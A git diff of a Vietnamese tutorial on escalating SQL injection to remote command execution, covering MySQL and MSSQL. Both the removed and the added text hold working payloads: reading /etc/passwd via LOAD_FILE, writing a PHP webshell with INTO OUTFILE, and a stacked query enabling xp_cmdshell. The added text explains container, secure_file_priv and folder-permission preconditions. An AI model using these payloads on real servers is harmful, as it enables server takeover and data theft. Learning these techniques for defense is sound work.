@@ -1,177 +1,128 @@
 # SQL-Injection-to-RCE
 
-# 1.Khái niệm
+Trước hết thì cần hiểu cấu trúc của cái phần tổ chức của một trang web
 
-Đây cũng chỉ là một kĩ thuật SQL Injection khác thôi . 
+để mình nói qua đoạn này cho các bạn hiểu , các website hiện này thường thì sẽ chạy trên 1 máy chủ ảo .
 
-Nhưng khác với các kỹ thuật khai thác còn lại chỉ có thể đọc được dữ liệu ở trong database , kỹ thuật này nó còn có thể chiếm quyền điều khiển máy chủ , thực hiện ghi File và thực thi lệnh trực tiếp 
+Tức là , có một cái máy chủ vật lý , trong đó sẽ chứa rất nhiều máy chủ ảo . Và để 1 website hoạt động thì sẽ có một hoặc nhiều container có các chức năng xử lý khác nhau tạo nên 1 trang web
 
-# 2. Kỹ thuật và điều kiện để khai thác 
+Nói dễ hiểu thì , giả sử máy chủ vật lý sẽ có một ổ cứng khoảng 10.000GB tùy loại , và sử dụng khoảng 100GB cho một máy chủ ảo (dạng dạng thế) . Tiếp tục một website khi chạy trên cái máy chủ ảo thì nó có thể có 2 container là container web và container db đang chạy trên máy chủ ảo đó 
 
-Ở đây chúng ta cần 3 điều kiến chính đó chính là 
+2 cái container đó nó nằm trên 2 đường dẫn khác nhau trong thư mục của máy chủ ảo
+```
+/var/lib/docker/<container_id_web>
+```
+```
+/var/lib/docker/<container_id_db>
+```
+RỒi giờ vào cái chính.
 
-- khi quyền kết nối web app với database phải là `root` hoặc `sa` chứ không được là `user`
-- Cho phép thực thi nhiều câu lệnh đối với MSSQL , còn MYSQL không cần điều kiện này
-- Điều kiện cuối là , đối với MYSQL thì biến `secure_file_priv` phải là rỗng để có thể cho phép đọc file , ghi file trực tiếp vào ổ cứng hệ thống . Đối với MSSQL thì cái file thư viện `xplog70.dll` nó không được xóa , bởi vì đó là cái thư viện hỗ trợ cho chức năng sử dụng các câu lệnh cmd dành cho SQL 
+Giả sử trang `banhangonline.com` , ở đó nó sẽ có các chức năng như Đăng kí , Đăng nhập , Hiển thị thông tin sản phẩm , Thanh toán ,...
 
-# 2.0 Sử dụng hàm LOAD_FILE() ĐỐI VỚI MYSQL
+website đó chạy trên một máy chủ ảo , chúng có 3 Container riêng biệt để xử lý.
 
-Ví dụ cho các bạn dễ hình dung ra thì hàm này nó có có thể đọc các file trong cả hệ thống miễn là tài khoản kết nối tới database có quyền đọc file đó và cấu hình của database cho phép
+- Container web: xử lý cái phần giao diện , chứa html , css , js
+
+- Container xử lý logic: nó chứa những code xử lý như register.php , buy.php , login.php , index.php
+
+- Container xử lý database: cái này chứa dữ liệu . Xử lý những truy vấn sql 
+
+Giả sử khi mà bấm vào xem cái áo thun 
+
+Container web sẽ gửi yêu cầu đến cái container xử lý logic , hãy đưa thông tin cái áo id=10 đây
+
+Container xử lý logic nó lại gửi một truy vấn rằng
 ```sql
-SELECT LOAD_FILE('Đường_dẫn_tới_file');
+SELECT * FROM product WHERE id=10
 ```
-Giả sử khi chúng ta SQL Injection URL thế này 
-```
-http://shop.com/index.php?id=10000 UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3 --
-```
-Thì thứ hiện ra  không phải là thông tin sản phẩm nữa mà chính là thông tin file cấu hình của hệ thống
+Gửi cái truy vấn đó đến Container xử lý database cũng thông qua network
 
-# 2.1. SỬ DỤNG INTO OUTFILE ĐỐI VỚI MYSQL 
+Container xử lý database nó tìm trong ổ cứng của nó , lấy dữ liệu rồi gửi lại và cứ thế hiển thị ra màn hình
 
-Thứ nhất là quyền `root` hoặc `sa`. Giải thích dễ hiểu thì các bạn cứ hiểu thế này . Giả sử trong backend sẽ có đoạn này
+Tương tự nếu mà chúng ta đăng nhập hay đăng kí cũng thế 
+
+Container web gửi dữ liệu user đã đăng kí đến Container logic rồi từ đó gửi truy vấn
 ```sql
-$nameservice = "db-blind-sqli";
-$username = "user";
-$password = "123456";
-$dbname = "blind_sqli_db";
+INSERT INTO users(username,password) values('abc123','12345678')
 ```
-Ở dòng `$username` đó , mỗi khi bạn vào trang web với quyền là một người dùng , thì cái username đó luôn luôn là user . Cái này ảnh hưởng đến quyền của bạn có thể sử dụng những câu lệnh với Database . 
+Gửi đến Container Database , rồi nó thực hiện câu truy vấn đó , lưu vào trong database
 
-Nhưng ở đây bạn phải phân biệt , bạn đăng nhập ở web nó khác với cái mà code web của bạn kết nối với Database . Với quyền user khi kết nối tới database thì Database nó chỉ cho code web của bạn gửi những câu lệnh chứa giả sử như `UNION` , `SELECT` , ... CÒn khi gửi những lệnh mà chứa các từ như `INTO OUT FILE` kia thì Database sẽ chặn ngay 
-
-Vậy thì cái đầu tiên cần để có thể thực thi RCE được chính là `backend` nó set up là `$username = "root"` 
-
-Tiếp tục , khi đã có quyền `root` kết nối với database thì Điều kiện cần tiếp theo đó chính là: 
-
-Với quyền root đó , cũng cần phải có quyền để ghi file vào thư mục Web bởi vì không hẳn có root là có thể làm tất cả 
-
-Giống như lúc nãy khi ta sử dụng 
+Vậy nếu ở cái chức năng hiển thị thông tin sản phẩm nó bị lỗi SQLi, chúng ta chèn được câu truy vấn thực hiện RCE thì sao 
 ```sql
-SELECT "<?php system($_GET['cmd']"; ?>" INTO OUT FILE 'var/www/html/shell.php'
+SELECT '<?php system('whoami'); ?>' INTO OUTFILE 'var/www/html/shell.php'
 ```
-Chúng ta sẽ không thể chèn file `shell.php` kia vào trong thư mục `var/www/html` được nếu mà không có quyền root và không có quyền khi đè file vào thư mục Web
+Lúc này tương tự vào đến Container db xử lý , nó thực hiện ghi file shell.php vào trong `var/www/html` của container db 
 
-Đấy là đối với hệ quản trị cơ sở dữ liệu MySQL . 
+Vậy thì chúng ta làm được gì không , khi truy cập lại vào `banhangonline/shell.php` thì Container web nó tìm kiếm trong `var/www/html` của nó coi có shell.php nào không
 
-Giả sử một web bán hàng sử tham số id để hiển thị thông tin sản phẩm
-```sql
-SELECT * FROM products where id = 1
+Và kết quả là chắc chắn 404 not found rồi. Bởi vì mỗi một container nó sẽ có một đường dẫn ổ cứng riêng của nó 
+
+Của container web
 ```
-Nếu ở đây chúng ta bắt buộc phải sử dụng dấu `;` để kết thúc câu lệnh trước vì không thể sử dụng UNION ở đây thì bắt buộc ở phía backend phải dùng
-
-Đối với php
+/var/lib/docker/<container_id_web>/var/www/html
 ```
-mysql_multi_query("truy_vấn_1 ; truy_vấn_2 ; ...")
+Của container db
 ```
-
-
-Ví dụ:
-
-Một website `shop.com` . Với chức năng xem chi tiết sản phẩm
-
+/var/lib/docker/<container_id_db>/var/www/html
 ```
-http:shop.com/product.php?id=1
-```
-Ở đây có lỗi SQL injection ở tham số id . Nếu chúng ta truyền vào :
-```sql
-1000 UNION SELECT "<?php system($_GET['cmd']; ?>",2,3 INTO OUTFILE '/var/www/html/shell.php'
-```
-Giải thích lệnh này:
+Các bạn đã thấy sự khác biệt chưa . Chính vì Container db thực hiện truy vấn chèn shell.php vào trong `/var/www/html`. Cho nên nó đã chèn vào trong Container của nó 
 
- -  `UNION SELECT "<?php....?>"` : tạo ra một chuỗi văn bản 
-
- -  `INTO OUTFILE '/var/www/html/shell.php'`: đặt tên là `shell.php` vào bên trong thư mục web `/var/www/html` 
-
-Lúc này câu truy vấn đưa vào trong Database sẽ là
-```
-SELECT * FROM products WHERE id = 1000 UNION SELECT "<?php...?>",2,3 INTO OUTFILE '/var/www/html/shell.php'
-```
-
-Nội dung bên trong `shell.php` sẽ trông như thế nàt
-```
-<?php system($_GET['cmd']); ?>	2	3
-```
-
-Kết quả là khi chúng ta truy cập vào `http://shop.com/shell.php?cmd=whoami` thì Web server(như Apache) nó nhìn thấy đuôi `.php` thì nó liền gọi Engine của php lên và thực thi nội dung bên trong file đấy . Trình duyệt hiện ra kết quả của câu lệnh `whoami` đấy là `root` hoặc `www-data`
-
-# 2.2. SỬ DỤNG XP_CMDSHELL ĐỐI VỚI MSSQL 
-
-Đối với hệ quản trị cơ sở dữ liệu MSSQL , thì lệnh để thực thi RCE nó sẽ là 
-
-```
-EXEC xp_cmdshell 'cmd'
-```
-Chúng ta không thể sử dụng UNION SELECT EXEC xp_cmdshell như thế được . Vì thể chúng ta cần phải sử dụng dấu chấm phẩy `;` để có thể thực thi nhiều câu truy vấn cùng một lúc
-
-Nhưng vấn đề là chúng ta cần backend nó cho phép gửi nhiều câu truy vấn cùng một lúc 
+Mà ở cái dùng để hiển thị giao diện web , cái mà chúng ta thấy được lại là do Container web xử lý ra
 
 
-Giải thích một số lệnh cơ bản
-```
-EXEC: viết tắt(exacute): chức năng chạy chương trình 
-DELACRE: khai báo biến 
-SET: nó giống như gán ( sau khi khai báo biến bằng DELACRE thì chúng ta phải dùng SET để gán)
-```
+Vậy để khi mà chúng ta truy vấn ghi file shell.php được thực hiện ở Container db mà muốn bên container web bị dính file shell.php kia thì cái `/var/www/html` phải là cái dùng chung giữa container db và container web
 
-quy trình để RCE thực tế trên MSSQL
+Điều đó chỉ có thể khi mà , chức năng xử lý web và xử lý db nó cùng một container Hoặc là cả 2 cái `/var/www/html` của 2 container web và db phải cùng mount tới một volume 
 
-Bật mode cấu hình nâng cao để chỉnh sửa các tính năng ẩn 
-```sql
-EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-```
-Bật xp_cmdshell
-```sql
-EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
-```
-Thực thi lệnh RCE . Bây giờ chạy bất kì lệnh cmd nào
-```sql
-EXEC xp_cmdshell 'whoami';
-```
+Nhưng mà từ xa xưa h các website thường làm vẫn là nhét database , web server , code vào chung một container , cái cách đó gọi là Monolithic Architecture , còn cái mà tách từng container riêng kia gọi là Micro Architecture.
 
-Giả sử ,bạn có một website `shop.com`
+Bản chất thì khi mà gửi dữ liệu hợp lệ thì cái dữ liệu đó sẽ luôn được đưa đến `/var/lib/mysql` như vầy . Còn cái `/var/www/html` là cái folder chứa những file `.html`, `.php` để hiển thị ra giao diện người dùng 
 
-Với chức năng lấy thông tin sản phẩm bằng tham số id . Câu truy vấn thực hiện
-```sql
-SELECT * FROM products WHERE id = 1
-```
-Nhưng nếu chúng ta không nhập vào tham số id là 1 mà nhập vào là
-```sql
-1; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; EXEC xp_cmdshell 'whoami';
-```
-Bởi vì web cho thực hiện việc gửi nhiều truy vấn một lúc , cho nên khi vào trong DATABASE thì thực tế sẽ là
-```sql
-SELECT * FROM products WHERE id =1;
-EXEC sp_configure 'show advanced options',1; RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
-EXEC xp_cmdshell 'whoami';
-```
-Kết quả khi đến dòng whoami kia thì tự động bật chương trình `cmd.exe` kia lên vào thực thi lệnh whoami . Kết quả nhận được thì SQL sẽ đưa vào một bảng riêng và trả về Client 
-
-# 2.3. Nạp lại file xplog70.dll đối với MSSQL
-
-Như đã nói trên thì muốn thực hiện SQLi to RCE thì bắt buộc phải dùng tới xp_cmdshell đối với MSSQL , nhưng 
-
-Khi mà file `xplog70.dll` bị xóa đi thì lệnh xp_cmdshell cũng trở nên vô tác dụng , bởi vì thư viện hỗ trợ nó đã bị xóa đi rồi mà
-
-Giải pháp ở đây chúng ta có thể tự tạo lại file đó rồi nạp lại cũng được mà trường hợp ở đây backend nó phải hỗ trợ thực thi nhiều lệnh một lúc và tài khoản kết nối tới SQL phải có quyền ghi File vào một thư mục trên hệ điều hành 
-
-Sau khi tạo lại đườ file `xplog70.dll` rồi thì chúng ta cần ghi file xuống ổ cứng . Ở đây thì chúng ta phải sử dụng OLE Automation . Nói dễ hiểu thì nó là một chức năng cho phép SQL Server điều khiển window của bạn , có thể tự động bật execl hoặc bật cmd lên này nọ ,... (các bạn tự tìm hiểu thêm về cái chức năng này thêm )
-
-Rồi tiếp tục khi đã nạp được file vào hệ thống rồi thì chúng ta sử dụng lại cái `xp_cmdshell` thôi
+**TÓM LẠI , ĐIỀU KIỆN THỨ NHẤT ĐỂ SQLI TO RCE ĐƯỢC LÀ PHẢI CÙNG CHUNG 1 CONTAINER VÀ FOLDER MÀ DB NÓ GHI FILE VÀO PHẢI LÀ CÁI FOLDER MÀ WEB SERVER NÓ CÓ THỂ ĐỌC VÀ THỰC THI ĐƯỢC**
 
 
-# 3.Cách phòng chống 
+-----
 
-- Sử dụng Prepared Statement cho mọi truy vấn của Database . Không được nối chuỗi
+Tiếp theo hãy xét đến từng lớp bảo mật , cái đầu tiên đó chính là cái quyền để có thể thực hiện các thao tác nhập và xuất dữ liệu của MySQL 
 
-- Với người dùng thì web app chỉ được kết nối tới database với user thường , chỉ có quyền sử dụng `UNION`, `SELECT` , `UPDATE` ,...Tuyệt đối không được set là `root` hay `sa`
+Biến `secure_file_priv` . Biến này được tạo ra để giới hạn các thao tác nhập và xuất dữ liệu với những câu lệnh như `SELECT .... INTO OUTFILE ....` , đây là những lệnh chỉ được thực hiện bởi những người dùng có đặc quyền 
 
-- Tắt `xp_cmdshell`, `OLE_Autonmation`
+Biến `secure_file_priv` có thể được thiết lập như sau:
 
-- Xóa các thư viện `.dll` nhạy cảm không dùng đến đối với MSSQL
+ - Nếu để trống , biến này sẽ không có tác dụng , tức là tất cả mọi người dù có là ai thì đều có thể thực hiện được những câu lệnh `SELECT .... INTO OUTFILE ....` kia vốn dĩ chỉ dành cho root
 
-- Sử dụng WAF để chặn các từ khóa như UNION,SELECT,... nếu phát hiện nó trong input nhập vào
+ - Nếu được thiết lập bằng với tên của một thư mục , thì lúc này MySQL nó sẽ quy định all user chỉ có thể nhập xuất dữ liệu với các tệp trong thư mục đó 
 
-- Set `secure_file_priv` = NULL bởi vì cái mode này chính là việc quyết định không cho đọc file(LOAD_FILE) hoặc ghi đề file vào trong ổ cứng
+ - Nếu để bằng với NULL , thì MySQL sẽ vô hiệu hóa các thao tác nhập xuất dữ liệu 
+
+(Nguồn: https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv)
+
+Vậy thì như đã nói trên , để có thể dùng được câu lệnh `SELECT .... INTO OUTFILE ....` RCE được thì buộc điều kiện cái biến `secure_file_priv` nó phải là trống hoặc phải bằng với tên thư mục mình cần ghi File vào đó
+
+----
+
+Sau khi đã có quyền của MySQL thì chúng ta cần thêm quyền từ hệ điều hành Linux , nó có cho phép MySQL thực hiện ghi File hoặc thực thi File trên Folder đấy hay không
+
+(nguồn: https://viblo.asia/p/chmod-777-no-thuc-su-nghia-la-gi-E375zw4JKGW)
+
+Trong Linux , có 2 phần thường lấy ra để xác định việc kiểm soát file , đó là `Classes` và `Permission`. Classes xác định ai có thể truy cập vào file còn `Permission` xác định loại hành động có thể thực hiện với File
+
+Classes có 3 loại gồm: Owner (người tạo ra các file folder) , Group(một nhóm người có chung permission) , Others(những người dùng khác trong hệ thống)
+
+Permission có 3 loại gồm: Read(chỉ đọc) , Write(được quyền ghi vào folder , sửa đổi nội dung file), excute(được quyền thực thi file)
+
+Tiếp theo mình sẽ nói đến cái con số 777 , 775 ,644 , ... cho các bạn dễ hiểu . Chữ số đầu tiên sẽ đại diện cho quyền của owner , chữ số thứ hai sẽ là quyền của Group , chữ số thứ 3 sẽ là quyền của Other
+
+Với các quyền nói nôm na là nó được gán với các con số , quyền Read số 4 , quyền Write số 2 , quyền excute số 1 , Nếu owner có cả 3 quyền thì sẽ là 4+2+1 = 7 , Nếu group chỉ có read và write thì sẽ là 4+2 = 6 , và Other chỉ có quyền Read thì sẽ là 4
+
+Vậy là chúng ta đã thiết lập được xong quyền thao tác với file đối với 3 loại đối tượng ở trong một Folder bằng con số 764
+
+Và tương tự , Ở đây chúng ta cần `Mysql` thực hiện ghi file vào trong folder `/var/www/html` , ở folder này thì web server chính là Owner còn Mysql thuộc others , Vì thế để Mysql có thể ghi file được vào folder thì chúng ta cần quyền Execute và quyền Write là được tức là Other lúc này sẽ là số 3 hoặc số 7 (Có thể ko cần read cũng được)
+
+Lưu í ở đây nữa , nếu chỉ cần other là số 7 thì chưa hết được , có thể các bạn thắc mắc vậy thì Owner là số 4 cũng được mà đúng ko ? Nhưng khi Owner là số 4 , ở trong thư mục /var/www/html , Web Server nó là Owner , nếu nó chỉ có quyền đọc thì làm sao mà có thể thực thi được đúng ko ? Vậy thì bây giờ Owner cần Read và Execute , Group thì cái gì cũng được, Còn Other thì phải có quyền Write và Execute (Nhắc lại đây là quyền đối với một Folder nhá)
+
+**ĐIỀU KIỆN THỨ 3: Set quyền đối với folder /var/www/html là 777 hoặc 503 hoặc 753 ,.... đều được**
+
+
 
 
